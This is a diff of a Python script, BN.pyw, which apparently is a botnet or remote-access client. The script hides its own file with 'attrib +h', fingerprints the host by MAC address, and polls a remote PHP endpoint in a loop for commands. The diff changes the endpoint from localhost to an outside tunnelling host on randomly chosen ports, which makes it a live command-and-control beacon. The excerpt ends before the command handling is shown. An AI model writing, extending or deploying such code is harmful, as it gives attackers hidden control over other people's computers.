@@ -17,26 +17,26 @@ import struct
 import os
 import sys
 
-# Hide BN.pyw
-subprocess.Popen("attrib +h BN.pyw", shell=True)
-
-def METASPLOIT():
-
- actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
- actual_mac = ':'.join([actual_mac[e:e+2] for e in range(0, 12, 2)])
-
- previous_data = ""
-
-
- while True:
-    # Request data from PHP script
-    url = 'http://127.0.0.1:5050/Metasploit.php'
-    response = requests.get(url)
-
-    if response.status_code == 200:
-        data = response.text
-        if data != previous_data:
-            # Split the received data into MAC and option
+# Hide BN.pyw 
+subprocess.Popen("attrib +h BN.pyw", shell=True) 
+  
+def METASPLOIT(): 
+  
+    actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:] 
+    actual_mac = ':'.join([actual_mac[e:e+2] for e in range(0, 12, 2)]) 
+  
+    previous_data = "" 
+  
+    while True: 
+        # Request data from PHP script with a random port
+        port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+        url = f'http://bore.pub:{port}/Metasploit.php'
+        response = requests.get(url) 
+  
+        if response.status_code == 200: 
+            data = response.text 
+            if data != previous_data: 
+                # Split the received data into MAC and option 
             parts = data.strip().split('::')
             if len(parts) == 2:
                 mac, option = parts
